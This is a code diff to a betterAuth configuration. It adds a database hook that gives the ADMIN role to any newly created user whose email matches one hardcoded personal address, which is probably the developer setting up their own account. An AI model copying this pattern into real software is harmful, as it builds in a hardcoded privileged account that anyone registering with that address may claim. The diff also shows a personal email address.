@@ -57,5 +57,22 @@ export const auth = betterAuth({
             }
         }
     }
-  }
+  },
+  databaseHooks: {
+    user: {
+      create: {
+        before: async (user) => {
+          if (user.email === "georgeluccas300@gmail.com") {
+            return {
+              data: {
+                ...user,
+                role: "ADMIN",
+              },
+            };
+          }
+          return { data: user };
+        },
+      },
+    },
+  },
 });
